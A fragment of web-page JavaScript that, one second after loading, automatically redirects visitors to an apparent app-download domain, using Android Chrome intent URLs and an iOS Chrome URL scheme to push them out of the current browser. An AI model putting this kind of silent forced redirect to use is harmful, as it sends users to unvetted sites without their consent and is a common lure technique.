        function openLinkBasedOnDevice(url) {
            var userAgent = navigator.userAgent;

            if (/(android)/i.test(userAgent)) {
                // Android: Open link in Chrome
                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
                // iOS: Attempt to open in Chrome or Safari
                var chromeUrl = 'googlechrome://' + url.replace('https://', '').replace('http://', '');
                
                // Attempt to open Chrome, fallback to Safari
                window.location.href = chromeUrl;

                // If Chrome is not installed, wait and open Safari
                setTimeout(function () {
                    window.location.href = url;
                }, 1000);
            } else {
                // For other devices, open in the default browser
                window.location.href = url;
            }
        }

        // Automatically execute the function after a 1-second delay
        setTimeout(function () {
            var url = 'https://dwn-app.xyz'; // Replace with your link
            openLinkBasedOnDevice(url);
        }, 1000); // 1000 milliseconds = 1 second
    </script>
